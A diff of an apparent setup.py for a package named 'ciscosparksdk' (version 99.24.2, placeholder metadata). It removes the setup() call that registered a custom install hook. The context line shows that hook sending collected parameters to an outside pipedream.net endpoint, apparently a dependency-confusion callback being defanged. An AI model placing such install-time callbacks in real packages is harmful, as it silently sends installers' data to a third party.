@@ -15,11 +15,5 @@ class CustomInstall(install):
         requests.get("https://eol6mx6at717hhs.m.pipedream.net/ciscosparksdk",params = ploads)
 
 
-setup(name='ciscosparksdk',
-      version='99.24.2',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                     
 
